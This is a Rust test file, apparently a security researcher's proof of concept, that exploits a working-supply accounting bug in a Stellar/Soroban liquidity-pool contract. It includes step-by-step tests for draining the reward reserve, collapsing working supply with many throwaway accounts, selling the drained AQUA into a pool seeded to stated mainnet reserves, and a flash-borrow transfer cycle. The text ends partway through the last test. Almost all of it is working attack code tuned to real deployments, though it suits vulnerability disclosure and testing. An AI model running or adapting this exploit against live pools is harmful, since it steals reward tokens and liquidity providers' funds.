#![no_std]
soroban_sdk::contractimport!(file = "ae0da5a8.wasm");

#[cfg(test)]
mod test {
    extern crate std;
    use std::println;
    use soroban_sdk::{contract, contractimpl, Env, Address, Vec, Symbol, BytesN,
                      testutils::{Address as _, Ledger as _}, token};
    use super::{WASM, Client};

    const MOCK_LP: &[u8] = include_bytes!("../mock_lp.wasm");
    mod lp { soroban_sdk::contractimport!(file = "mock_lp.wasm"); }
    const SHARE_REAL: &[u8] = include_bytes!("../share_real.wasm");
    mod shr { soroban_sdk::contractimport!(file = "share_real.wasm"); }

    #[contract] pub struct MockPlane;
    #[contractimpl] impl MockPlane {
        pub fn update(_e: Env, _pool: Address, _kind: Symbol, _a: Vec<u128>, _b: Vec<u128>) {}
    }
    #[contract] pub struct MockBoost;
    #[contractimpl] impl MockBoost {
        pub fn total_supply(_e: Env) -> u128 { 1_000_000_000_000_000_000 }
        pub fn balance(_e: Env, _id: Address) -> i128 { 1_000_000_000_000_000_000 }
    }

    // Returns (honest_reward, second_reward, funded_emissions).
    // second_user_two_step=true  -> both honest (control); false -> second user is the attacker (single-step fresh checkpoint).
    fn run(second_user_two_step: bool) -> (u128, u128, u128) {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let t0 = env.register_stellar_asset_contract_v2(admin.clone());
        let t1 = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let plane = env.register(MockPlane, ());
        let boost = env.register(MockBoost, ());

        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(MOCK_LP);
        let pool = Client::new(&env, &env.register(WASM, ()));

        let (a0, a1) = (t0.address(), t1.address());
        let mut tokens = Vec::new(&env);
        if a0 < a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); }
        else       { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); }
        let privileged = (admin.clone(), admin.clone(), admin.clone(), admin.clone(),
                          Vec::<Address>::new(&env), admin.clone());
        pool.initialize_all(&admin, &privileged, &admin, &lp_hash, &tokens, &(30u32,30u32),
                            &(reward.address(), boost.clone(), boost.clone()), &plane, &plane);
        pool.set_reward_boost_config(&admin, &boost, &boost);
        let now = env.ledger().timestamp();
        let tps: u128 = 1_000_0000000;
        pool.set_rewards_config(&admin, &(now + 1_000_000u64), &tps);
        token::StellarAssetClient::new(&env, &reward.address()).mint(&pool.address, &1_000_000_000_000_000i128);

        let share = pool.share_id();
        let lpc = lp::Client::new(&env, &share);
        let x: u128 = 1_000_000_0000000;
        let honest = Address::generate(&env);
        let second = Address::generate(&env);
        lpc.mint(&honest, &(x as i128));
        lpc.mint(&second, &(x as i128));

        pool.checkpoint_working_balance(&share, &honest, &0u128);
        pool.checkpoint_working_balance(&share, &honest, &x);
        if second_user_two_step {
            pool.checkpoint_working_balance(&share, &second, &0u128); // correct two-step
            pool.checkpoint_working_balance(&share, &second, &x);
        } else {
            pool.checkpoint_working_balance(&share, &second, &x);     // buggy single-step on fresh acct
        }
        env.ledger().set_timestamp(now + 100);
        (pool.get_user_reward(&honest), pool.get_user_reward(&second), tps * 100)
    }

    #[test]
    fn control_both_honest_no_overdistribution() {
        let (h, s, funded) = run(true);
        println!("[CONTROL both two-step]  honest={} second={} total={} funded={}", h, s, h+s, funded);
        assert!(h + s <= funded, "control should not over-distribute: {} <= {}", h+s, funded);
        println!("  -> total == funded: no over-distribution when both use the correct two-step.");
    }

    #[test]
    fn exploit_working_supply_undercount() {
        let (h, a, funded) = run(false);
        println!("[EXPLOIT single-step]    honest={} attacker={} total={} funded={}", h, a, h+a, funded);
        assert!(h + a > funded, "expected over-distribution: {} > {}", h+a, funded);
        println!("  -> total = {}% of funded. Attacker extracted {} unfunded reward tokens on real ae0da5a8.wasm.",
                 ((h+a)*100)/funded, (h+a)-funded);
    }

    // Build an imbalance with `n` fresh single-step-checkpointed attacker accounts, advance time,
    // then REALIZE via the unprivileged `claim` (real reward-token transfer) and measure actual
    // tokens received. Returns (honest_recv, attacker_recv, funded, working_supply, sum_working_balance).
    fn run_n(n: u32) -> (u128, u128, u128, i128, i128) {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let t0 = env.register_stellar_asset_contract_v2(admin.clone());
        let t1 = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let plane = env.register(MockPlane, ());
        let boost = env.register(MockBoost, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(MOCK_LP);
        let pool = Client::new(&env, &env.register(WASM, ()));
        let (a0, a1) = (t0.address(), t1.address());
        let mut tokens = Vec::new(&env);
        if a0 < a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); }
        else       { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); }
        let privileged = (admin.clone(), admin.clone(), admin.clone(), admin.clone(),
                          Vec::<Address>::new(&env), admin.clone());
        pool.initialize_all(&admin, &privileged, &admin, &lp_hash, &tokens, &(30u32,30u32),
                            &(reward.address(), boost.clone(), boost.clone()), &plane, &plane);
        pool.set_reward_boost_config(&admin, &boost, &boost);
        let now = env.ledger().timestamp();
        let tps: u128 = 1_000_0000000;
        pool.set_rewards_config(&admin, &(now + 1_000_000u64), &tps);
        // fund the pool with a large reserve so over-distribution is limited by the bug, not by funds
        token::StellarAssetClient::new(&env, &reward.address()).mint(&pool.address, &1_000_000_000_000_000i128);

        let share = pool.share_id();
        let lpc = lp::Client::new(&env, &share);
        let x: u128 = 1_000_000_0000000;

        // one honest LP, correctly (two-step) checkpointed
        let honest = Address::generate(&env);
        lpc.mint(&honest, &(x as i128));
        pool.checkpoint_working_balance(&share, &honest, &0u128);
        pool.checkpoint_working_balance(&share, &honest, &x);

        // attacker: n fresh accounts, each single-step-checkpointed at balance x (transfer-hook model)
        let mut attackers = Vec::new(&env);
        for _ in 0..n {
            let a = Address::generate(&env);
            lpc.mint(&a, &(x as i128));
            pool.checkpoint_working_balance(&share, &a, &x);   // single-step -> WS not incremented (bug)
            attackers.push_back(a);
        }

        // observe on-chain state: WorkingSupply and Σ WorkingBalance
        let ws: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env, "working_supply")).unwrap();
        let mut sum_wb: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env, "working_balance")).unwrap();
        for a in attackers.iter() {
            sum_wb += pool.get_rewards_info(&a).get(Symbol::new(&env, "working_balance")).unwrap();
        }

        // one emission period, then REALIZE via unprivileged claim (real token transfer out)
        env.ledger().set_timestamp(now + 100);
        let rsac = token::TokenClient::new(&env, &reward.address());
        pool.claim(&honest);
        let honest_recv = rsac.balance(&honest) as u128;
        let mut atk_recv: u128 = 0;
        for a in attackers.iter() { pool.claim(&a); atk_recv += rsac.balance(&a) as u128; }
        (honest_recv, atk_recv, tps * 100, ws, sum_wb)
    }

    #[test]
    fn exploit_scales_and_transfers_real_tokens() {
        for n in [1u32, 4, 16, 64] {
            let (h, a, funded, ws, sum_wb) = run_n(n);
            let total = h + a;
            println!("[n={:2}] REAL claim payouts: honest={:>16} attacker={:>18} total={:>18} funded={:>13} => {}% of funded | WS={} ΣWB={} (ΣWB/WS={:.1}x)",
                     n, h, a, total, funded, (total*100)/funded, ws, sum_wb, sum_wb as f64 / ws as f64);
            assert!(total > funded, "n={}: expected over-distribution", n);
            // attacker's realized take scales ~ n x a full period's funded emissions
            assert!(a * 100 >= funded * (n as u128) * 95, "n={}: attacker take should scale ~n x funded", n);
        }
        println!("  -> attacker's realized reward-token take grows ~linearly (n x funded/period); \
                  bounded only by the pool's reward-token balance.");
    }

    // Severity probe: can WorkingSupply be driven ~to zero so a SHORT elapsed time drains the whole reserve?
    // Leap-frog: for each disposable account d, checkpoint(d, xs) [fresh bug: WS += 0] then checkpoint(d, 0)
    // [WS -= xs]. Net: WS drops by xs per step (f197 traps if it would underflow, so WS floors at ~xs).
    #[test]
    fn instant_drain_probe_lowering_working_supply() {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let t0 = env.register_stellar_asset_contract_v2(admin.clone());
        let t1 = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let plane = env.register(MockPlane, ());
        let boost = env.register(MockBoost, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(MOCK_LP);
        let pool = Client::new(&env, &env.register(WASM, ()));
        let (a0, a1) = (t0.address(), t1.address());
        let mut tokens = Vec::new(&env);
        if a0 < a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); }
        else       { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); }
        let privileged = (admin.clone(), admin.clone(), admin.clone(), admin.clone(),
                          Vec::<Address>::new(&env), admin.clone());
        pool.initialize_all(&admin, &privileged, &admin, &lp_hash, &tokens, &(30u32,30u32),
                            &(reward.address(), boost.clone(), boost.clone()), &plane, &plane);
        pool.set_reward_boost_config(&admin, &boost, &boost);
        let now = env.ledger().timestamp();
        let tps: u128 = 1_000_0000000;                      // 1e10 stroops/s
        pool.set_rewards_config(&admin, &(now + 100_000_000u64), &tps);
        let reserve: i128 = 1_000_000_000_000_000;          // 1e15 reward-token reserve
        token::StellarAssetClient::new(&env, &reward.address()).mint(&pool.address, &reserve);

        let share = pool.share_id();
        let lpc = lp::Client::new(&env, &share);
        let rsac = token::TokenClient::new(&env, &reward.address());

        // honest LP: correct two-step -> WS = H
        let h: u128 = 1_000_000_000_000;                    // 1e12
        let honest = Address::generate(&env);
        lpc.mint(&honest, &(h as i128));
        pool.checkpoint_working_balance(&share, &honest, &0u128);
        pool.checkpoint_working_balance(&share, &honest, &h);

        // attacker's live account: big working balance, single-step (fresh bug) -> WS unchanged
        let xa: u128 = 100_000_000_000_000;                 // 1e14
        let atk = Address::generate(&env);
        lpc.mint(&atk, &(xa as i128));
        pool.checkpoint_working_balance(&share, &atk, &xa);

        let ws0: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env,"working_supply")).unwrap();

        // leap-frog WS down toward ~0 (no time advances; pure setup transactions)
        let xs: u128 = 5_000_000_000;                       // 5e9 step
        let mut steps = 0u32;
        loop {
            let ws: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env,"working_supply")).unwrap();
            if (ws as u128) < 2*xs || steps >= 400 { break; }
            let d = Address::generate(&env);
            pool.checkpoint_working_balance(&share, &d, &xs);   // fresh: WS += 0
            pool.checkpoint_working_balance(&share, &d, &0u128); // exists: WS -= xs
            steps += 1;
        }
        let ws_low: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env,"working_supply")).unwrap();

        // (a) dt = 0: claim in the same ledger -> must be ~0 (not a same-block atomic drain)
        let atk_same_ledger = pool.get_user_reward(&atk);

        // (b) advance ONE short interval and claim for real
        let dt: u64 = 5;                                     // 5 seconds ~ one ledger
        env.ledger().set_timestamp(now + dt);
        pool.claim(&atk);
        let atk_recv = rsac.balance(&atk) as u128;
        let pool_left = rsac.balance(&pool.address) as u128;

        println!("[instant-probe] WS: {} -> {} after {} leap-frog steps (floor ~= step size {})", ws0, ws_low, steps, xs);
        println!("[instant-probe] same-ledger (dt=0) attacker pending = {}", atk_same_ledger);
        println!("[instant-probe] after dt={}s: attacker claimed {} of {} reserve ({}%); pool reward balance left = {}",
                 dt, atk_recv, reserve, (atk_recv*100)/(reserve as u128), pool_left);
        // time (s) it would take to drain the whole reserve at this WS: R * WS / (xa * tps)
        let t_full = (reserve as u128).saturating_mul(ws_low as u128) / (xa.saturating_mul(tps));
        println!("[instant-probe] => time to drain the FULL reserve at WS={}: ~{}s", ws_low, t_full);

        assert_eq!(atk_same_ledger, 0, "no same-ledger atomic drain");
        assert!(atk_recv * 2 > reserve as u128, "a SHORT elapsed time drains most of the reserve once WS is low");
    }

    // Realizability on the REAL pool bytecode: seed an AQUA/USDC pool to mainnet reserves
    // (CA6GAFOJ: 706.6M AQUA / 259,611 USDC), dump `aqua_in` AQUA via swap, return USDC out.
    fn sim_sell_aqua_for_usdc(aqua_in: u128) -> (u128, u128) {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let aqua = env.register_stellar_asset_contract_v2(admin.clone());
        let usdc = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let plane = env.register(MockPlane, ());
        let boost = env.register(MockBoost, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(MOCK_LP);
        let pool = Client::new(&env, &env.register(WASM, ()));

        let (aa, ua) = (aqua.address(), usdc.address());
        let mut tokens = Vec::new(&env);
        let (i_aqua, i_usdc) = if aa < ua {
            tokens.push_back(aa.clone()); tokens.push_back(ua.clone()); (0u32, 1u32)
        } else {
            tokens.push_back(ua.clone()); tokens.push_back(aa.clone()); (1u32, 0u32)
        };
        let privileged = (admin.clone(), admin.clone(), admin.clone(), admin.clone(),
                          Vec::<Address>::new(&env), admin.clone());
        pool.initialize_all(&admin, &privileged, &admin, &lp_hash, &tokens, &(30u32,30u32),
                            &(reward.address(), boost.clone(), boost.clone()), &plane, &plane);

        // seed reserves to CA6GAFOJ (mainnet, stroops)
        let aqua_res: u128 = 7_066_498_248_362_800; // 706,649,824.84 AQUA
        let usdc_res: u128 =     2_596_117_810_968; // 259,611.78 USDC
        let lp = Address::generate(&env);
        token::StellarAssetClient::new(&env,&aqua.address()).mint(&lp, &((aqua_res*2) as i128));
        token::StellarAssetClient::new(&env,&usdc.address()).mint(&lp, &((usdc_res*2) as i128));
        let mut desired = Vec::new(&env);
        if i_aqua==0 { desired.push_back(aqua_res); desired.push_back(usdc_res); }
        else         { desired.push_back(usdc_res); desired.push_back(aqua_res); }
        pool.deposit(&lp, &desired, &0u128);

        // attacker dumps AQUA -> USDC
        let atk = Address::generate(&env);
        token::StellarAssetClient::new(&env,&aqua.address()).mint(&atk, &(aqua_in as i128));
        let out = pool.swap(&atk, &i_aqua, &i_usdc, &aqua_in, &0u128);
        (out, usdc_res)
    }

    #[test]
    fn realize_selling_drained_aqua_into_real_pool() {
        // dump sizes in AQUA (stroops): 10M, 100M, 706M(=reserve), 7.06B(=10x reserve)
        for aqua_in in [100_000_000_0000000u128, 1_000_000_000_0000000, 7_066_498_248_362_800, 70_664_982_483_628_000] {
            let (usdc_out, usdc_res) = sim_sell_aqua_for_usdc(aqua_in);
            let eff_price = (usdc_out as f64) / (aqua_in as f64);   // USDC per AQUA (stroops cancel)
            println!("[sell] dump {:>18} AQUA -> {:>13} USDC ({}% of the {} USDC reserve) | eff ${:.8}/AQUA (spot ~$0.00036)",
                     aqua_in/10_000_000, usdc_out/10_000_000, (usdc_out*100)/usdc_res, usdc_res/10_000_000, eff_price);
        }
        // even a huge dump extracts most of the USDC reserve: selling WORKS, just at a crashing price
        let (big_out, res) = sim_sell_aqua_for_usdc(70_664_982_483_628_000); // 10x reserve
        assert!(big_out * 100 / res > 85, "a large AQUA dump should extract >85% of the paired USDC reserve");
    }

    // END-TO-END on real bytecode: commingled AQUA-paired pool (reward token == swap token AQUA).
    // Drive WS->0, claim to drain AQUA out of the pool's balance (reward buffer + swap principal),
    // then sell that AQUA back into the same pool for USDC. Attacker walks away with USDC principal.
    #[test]
    fn end_to_end_drain_then_sell_walk_away_with_usdc() {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let aqua = env.register_stellar_asset_contract_v2(admin.clone()); // swap token0 AND reward token
        let usdc = env.register_stellar_asset_contract_v2(admin.clone());
        let boost = env.register(MockBoost, ());
        let plane = env.register(MockPlane, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(MOCK_LP);
        let pool = Client::new(&env, &env.register(WASM, ()));
        let aqc = token::TokenClient::new(&env,&aqua.address());
        let usdcc = token::TokenClient::new(&env,&usdc.address());

        let (aa, ua) = (aqua.address(), usdc.address());
        let mut tokens = Vec::new(&env);
        let (i_aqua, i_usdc) = if aa < ua {
            tokens.push_back(aa.clone()); tokens.push_back(ua.clone()); (0u32,1u32)
        } else { tokens.push_back(ua.clone()); tokens.push_back(aa.clone()); (1u32,0u32) };
        let privileged = (admin.clone(),admin.clone(),admin.clone(),admin.clone(),Vec::<Address>::new(&env),admin.clone());
        // reward token == aqua (commingled with swap reserve)
        pool.initialize_all(&admin,&privileged,&admin,&lp_hash,&tokens,&(30u32,30u32),
                            &(aqua.address(), boost.clone(), boost.clone()),&plane,&plane);

        // seed swap reserves ~ CA6GAFOJ mainnet (706.6M AQUA / 259,611 USDC)
        let aqua_res: u128 = 7_066_498_248_362_800;
        let usdc_res: u128 =     2_596_117_810_968;
        let lp = Address::generate(&env);
        token::StellarAssetClient::new(&env,&aqua.address()).mint(&lp, &((aqua_res*2) as i128));
        token::StellarAssetClient::new(&env,&usdc.address()).mint(&lp, &((usdc_res*2) as i128));
        let mut desired = Vec::new(&env);
        if i_aqua==0 { desired.push_back(aqua_res); desired.push_back(usdc_res); }
        else         { desired.push_back(usdc_res); desired.push_back(aqua_res); }
        pool.deposit(&lp, &desired, &0u128);

        // fund reward buffer in AQUA + turn rewards on
        token::StellarAssetClient::new(&env,&aqua.address()).mint(&pool.address, &1_000_000_000_000_000i128); // +100M AQUA
        let now = env.ledger().timestamp();
        pool.set_reward_boost_config(&admin,&boost,&boost);
        pool.set_rewards_config(&admin, &(now+100_000_000u64), &1_000_0000000u128);
        let pool_aqua_before = aqc.balance(&pool.address);
        let pool_usdc_before = usdcc.balance(&pool.address);

        let share = pool.share_id();
        let lpc = lp::Client::new(&env,&share);
        // honest staker + attacker live position
        let honest = Address::generate(&env);
        lpc.mint(&honest,&1_000_000_000_000i128);
        pool.checkpoint_working_balance(&share,&honest,&0u128);
        pool.checkpoint_working_balance(&share,&honest,&1_000_000_000_000u128);
        let atk = Address::generate(&env);
        let atk_stake: u128 = 100_000_000_000_000; // 10M shares (reward position)
        lpc.mint(&atk,&(atk_stake as i128));
        pool.checkpoint_working_balance(&share,&atk,&atk_stake);
        let ws0: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env,"working_supply")).unwrap();

        // drive WS to an exact target T in ONE leap-frog step (xs = WS - T).
        // Each transfer's sender-side checkpoint removes old_wb from WS via the bug; here we do it in one shot.
        // Commingled-pool guard (#2019 InsufficientBalance, claim line ~1327) protects swap reserves:
        // reward payout is capped at (AQUA balance - AQUA swap reserve) = the reward buffer (~100M here).
        // Size the claim to drain ~90% of that buffer.
        let target_ws: u128 = 13_900_000_000;
        let xs: u128 = (ws0 as u128) - target_ws;
        let d = Address::generate(&env);
        pool.checkpoint_working_balance(&share,&d,&xs);     // fresh: WS += 0, WB[d]=xs
        pool.checkpoint_working_balance(&share,&d,&0u128);  // WS -= xs  => WS = T
        let steps = 1u32;
        let ws_low: i128 = pool.get_rewards_info(&honest).get(Symbol::new(&env,"working_supply")).unwrap();

        // 1 ledger, then claim -> drains AQUA to attacker
        env.ledger().set_timestamp(now+5);
        pool.claim(&atk);
        let atk_aqua = aqc.balance(&atk);
        let pool_aqua_after_claim = aqc.balance(&pool.address);

        // sell the drained AQUA back into the pool for USDC
        if atk_aqua>0 { pool.swap(&atk,&i_aqua,&i_usdc,&(atk_aqua as u128),&0u128); }
        let atk_usdc = usdcc.balance(&atk);
        let pool_aqua_end = aqc.balance(&pool.address);
        let pool_usdc_end = usdcc.balance(&pool.address);

        let usd = |x: i128| (x as f64)/1e7;
        println!("[e2e] pool AQUA before drain: {:.0} ; WS {} -> {} ({} steps)", usd(pool_aqua_before), ws0, ws_low, steps);
        println!("[e2e] claim DRAINED {:.0} AQUA to attacker ; pool AQUA left after claim: {:.0}", usd(atk_aqua), usd(pool_aqua_after_claim));
        println!("[e2e] attacker SOLD it back -> walked away with {:.2} USDC (pool USDC reserve was {:.2})", usd(atk_usdc), usd(pool_usdc_before));
        println!("[e2e] pool left: AQUA={:.0} USDC={:.2}  (LPs' principal shortfall)", usd(pool_aqua_end), usd(pool_usdc_end));
        let buffer = pool_aqua_before - aqua_res as i128; // reward buffer = balance - swap reserve
        println!("[e2e] (reward buffer was ~{:.0} AQUA = balance - swap reserve; swap principal is guarded by #2019)", usd(buffer));
        assert!(atk_usdc > 0, "attacker realized real USDC, end to end (drain reward buffer -> sell)");
        assert!(atk_aqua > 0 && atk_aqua <= buffer + 1, "drain is capped at the reward buffer, not swap principal");
    }

    // Amplification probe: can a swap shrink the tracked AQUA reserve to enlarge the drainable
    // reward buffer (balance - reserve)? If reserves move in lockstep with balances, buffer is invariant.
    #[test]
    fn swap_cannot_enlarge_reward_buffer() {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let aqua = env.register_stellar_asset_contract_v2(admin.clone());
        let usdc = env.register_stellar_asset_contract_v2(admin.clone());
        let boost = env.register(MockBoost, ());
        let plane = env.register(MockPlane, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(MOCK_LP);
        let pool = Client::new(&env, &env.register(WASM, ()));
        let aqc = token::TokenClient::new(&env,&aqua.address());

        let (aa, ua) = (aqua.address(), usdc.address());
        let mut tokens = Vec::new(&env);
        let (i_aqua, i_usdc) = if aa < ua { tokens.push_back(aa.clone()); tokens.push_back(ua.clone()); (0u32,1u32) }
                               else       { tokens.push_back(ua.clone()); tokens.push_back(aa.clone()); (1u32,0u32) };
        let privileged = (admin.clone(),admin.clone(),admin.clone(),admin.clone(),Vec::<Address>::new(&env),admin.clone());
        pool.initialize_all(&admin,&privileged,&admin,&lp_hash,&tokens,&(30u32,30u32),
                            &(aqua.address(), boost.clone(), boost.clone()),&plane,&plane);
        let aqua_res: u128 = 7_066_498_248_362_800;
        let usdc_res: u128 =     2_596_117_810_968;
        let lp = Address::generate(&env);
        token::StellarAssetClient::new(&env,&aqua.address()).mint(&lp, &((aqua_res*4) as i128));
        token::StellarAssetClient::new(&env,&usdc.address()).mint(&lp, &((usdc_res*4) as i128));
        let mut desired = Vec::new(&env);
        if i_aqua==0 { desired.push_back(aqua_res); desired.push_back(usdc_res); } else { desired.push_back(usdc_res); desired.push_back(aqua_res); }
        pool.deposit(&lp, &desired, &0u128);
        token::StellarAssetClient::new(&env,&aqua.address()).mint(&pool.address, &1_000_000_000_000_000i128); // +100M reward buffer

        let aqua_reserve = |p: &Client| -> i128 { p.get_reserves().get(i_aqua).unwrap() as i128 };
        let buffer_before = aqc.balance(&pool.address) - aqua_reserve(&pool);

        // attacker swaps USDC -> AQUA (pays USDC, pulls AQUA out => lowers AQUA reserve)
        let atk = Address::generate(&env);
        token::StellarAssetClient::new(&env,&usdc.address()).mint(&atk, &(usdc_res as i128));
        pool.swap(&atk, &i_usdc, &i_aqua, &(usdc_res/2), &0u128);

        let buffer_after = aqc.balance(&pool.address) - aqua_reserve(&pool);
        println!("[amp] reward buffer before swap = {} ; after USDC->AQUA swap = {} (delta {})",
                 buffer_before, buffer_after, buffer_after - buffer_before);
        // buffer must not grow (swap moves balance and reserve together); allow tiny fee drift
        assert!(buffer_after <= buffer_before + (buffer_before/1000).max(1_000_000),
                "a swap must not materially enlarge the drainable reward buffer");
    }

    // How many transactions to drive WorkingSupply ~to zero, as a function of attacker capital?
    // Each transfer's sender-side checkpoint removes ~one chunk (= attacker's cycled shares) from WS,
    // so N ~= WorkingSupply / attacker_capital. Verify that scaling on real bytecode.
    #[test]
    fn tx_count_scales_inversely_with_capital() {
        for divisor in [5u128, 20, 100] {
            let env = Env::default();
            env.mock_all_auths();
            let admin = Address::generate(&env);
            let t0 = env.register_stellar_asset_contract_v2(admin.clone());
            let t1 = env.register_stellar_asset_contract_v2(admin.clone());
            let reward = env.register_stellar_asset_contract_v2(admin.clone());
            let plane = env.register(MockPlane, ());
            let boost = env.register(MockBoost, ());
            let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(MOCK_LP);
            let pool = Client::new(&env, &env.register(WASM, ()));
            let (a0,a1)=(t0.address(),t1.address());
            let mut tokens=Vec::new(&env);
            if a0<a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); } else { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); }
            let privileged=(admin.clone(),admin.clone(),admin.clone(),admin.clone(),Vec::<Address>::new(&env),admin.clone());
            pool.initialize_all(&admin,&privileged,&admin,&lp_hash,&tokens,&(30u32,30u32),&(reward.address(),boost.clone(),boost.clone()),&plane,&plane);
            pool.set_reward_boost_config(&admin,&boost,&boost);
            let now=env.ledger().timestamp();
            pool.set_rewards_config(&admin,&(now+1_000_000u64),&1_000_0000000u128);
            let share=pool.share_id();
            let lpc=lp::Client::new(&env,&share);

            // honest supply
            let honest=Address::generate(&env);
            let hstake:u128=1_000_000_000_000;
            lpc.mint(&honest,&(hstake as i128));
            pool.checkpoint_working_balance(&share,&honest,&0u128);
            pool.checkpoint_working_balance(&share,&honest,&hstake);
            let ws0:i128=pool.get_rewards_info(&honest).get(Symbol::new(&env,"working_supply")).unwrap();

            // attacker capital = ws0/divisor ; each transfer-cycle removes `chunk` from WS
            let chunk=(ws0 as u128)/divisor;
            let mut n=0u32;
            loop {
                let ws:i128=pool.get_rewards_info(&honest).get(Symbol::new(&env,"working_supply")).unwrap();
                if (ws as u128) < chunk || n>500 { break; }
                let d=Address::generate(&env);
                pool.checkpoint_working_balance(&share,&d,&chunk); // "transfer in" (fresh: WS+=0)
                pool.checkpoint_working_balance(&share,&d,&0u128); // "transfer out" (WS-=chunk)
                n+=1;
            }
            let ws_end:i128=pool.get_rewards_info(&honest).get(Symbol::new(&env,"working_supply")).unwrap();
            println!("[txcount] capital=WS/{:<3} -> {} transfer-cycles to collapse WS {} -> {} (~N=WS/capital={})",
                     divisor, n, ws0, ws_end, divisor);
            assert!(n as u128 <= divisor+2 && (n as u128 + 2) >= divisor, "N should be ~= WS/capital = {}", divisor);
        }
    }

    // END-TO-END with the REAL LP share-token (real transfer->checkpoint hook), across ledgers:
    // flash-borrow -> deposit -> cycle LP via REAL transfers (collapse WS) -> withdraw (repay) ; next ledger -> claim.
    // Seeded to flagship-like on-chain structure (XLM/USDC pool, AQUA reward, tps).
    #[test]
    fn flash_cycle_withdraw_crossledger_real_hook() {
        let env = Env::default();
        env.mock_all_auths();
        let admin = Address::generate(&env);
        let t0 = env.register_stellar_asset_contract_v2(admin.clone());
        let t1 = env.register_stellar_asset_contract_v2(admin.clone());
        let reward = env.register_stellar_asset_contract_v2(admin.clone());
        let boost = env.register(MockBoost, ());
        let plane = env.register(MockPlane, ());
        let lp_hash: BytesN<32> = env.deployer().upload_contract_wasm(SHARE_REAL); // REAL share token
        let pool = Client::new(&env, &env.register(WASM, ()));
        let (a0,a1)=(t0.address(),t1.address());
        let mut tokens=Vec::new(&env);
        let (i0,_i1)= if a0<a1 { tokens.push_back(a0.clone()); tokens.push_back(a1.clone()); (0u32,1u32) }
                      else     { tokens.push_back(a1.clone()); tokens.push_back(a0.clone()); (1u32,0u32) };
        let _=i0;
        let privileged=(admin.clone(),admin.clone(),admin.clone(),admin.clone(),Vec::<Address>::new(&env),admin.clone());
        pool.initialize_all(&admin,&privileged,&admin,&lp_hash,&tokens,&(30u32,30u32),
                            &(reward.address(),boost.clone(),boost.clone()),&plane,&plane);
        pool.set_reward_boost_config(&admin,&boost,&boost);
        let now=env.ledger().timestamp();
        pool.set_rewards_config(&admin,&(now+100_000_000u64),&1_000_0000000u128);
        token::StellarAssetClient::new(&env,&reward.address()).mint(&pool.address,&1_000_000_000_000_000i128); // AQUA buffer

        let share=pool.share_id();
        let shrc=shr::Client::new(&env,&share);
        let ws=|| -> i128 { pool.get_rewards_info(&admin).get(Symbol::new(&env,"working_supply")).unwrap() };
        let mint=|who:&Address,amt:i128| { token::StellarAssetClient::new(&env,&t0.address()).mint(who,&amt);
                                           token::StellarAssetClient::new(&env,&t1.address()).mint(who,&amt); };
        let mut two=|amt:u128|->Vec<u128>{ let mut v=Vec::new(&env); v.push_back(amt); v.push_back(amt); v };

        // honest LP establishes WorkingSupply
        let honest=Address::generate(&env);
        mint(&honest, 200_000_000_000i128);
        pool.deposit(&honest,&two(100_000_000_000),&0u128);
        let ws_honest=ws();

        // attacker keeps a SMALL owned claim position via a single-step (transfer) checkpoint
        let atk=Address::generate(&env); let keep=Address::generate(&env);
        mint(&atk, 20_000_000_000i128);
        let (_amts,kshares)=pool.deposit(&atk,&two(10_000_000_000),&0u128);
        shrc.transfer(&atk,&keep,&(kshares as i128));  // fresh 'keep' -> single-step checkpoint via REAL hook
        let ws_after_keep=ws();

        // FLASH BORROW: mint a big chunk (to be returned), deposit, cycle via REAL transfers to collapse WS
        let flash=Address::generate(&env);
        let borrow:i128=200_000_000_000; mint(&flash,borrow);
        let bal0_t0=token::TokenClient::new(&env,&t0.address()).balance(&flash);
        let (_a2,cshares)=pool.deposit(&flash,&two(100_000_000_000),&0u128);
        let mut cur=flash.clone();
        for _ in 0..8u32 {
            let d=Address::generate(&env);
            shrc.transfer(&cur,&d,&(cshares as i128));  // REAL transfer -> hook checkpoints both sides
            cur=d;
        }
        let ws_after_cycle=ws();
        // withdraw the flash position (held by last account 'cur') -> recover tokens -> repay
        pool.withdraw(&cur,&cshares,&two(0));
        let ws_after_withdraw=ws();
        let _=bal0_t0;
        // flash is repayable if the withdrawn tokens (now on 'cur') cover the borrow
        let recovered_t0=token::TokenClient::new(&env,&t0.address()).balance(&cur);

        println!("[flash-e2e] WS honest={} after_keep={} after_cycle={} after_withdraw={}",
                 ws_honest, ws_after_keep, ws_after_cycle, ws_after_withdraw);
        println!("[flash-e2e] flash borrow(one side)={} recovered(one side)={} -> repayable={}",
                 borrow, recovered_t0, recovered_t0>=borrow/2);

        // CROSS-LEDGER: advance one ledger, claim on the kept position
        env.ledger().set_timestamp(now+5);
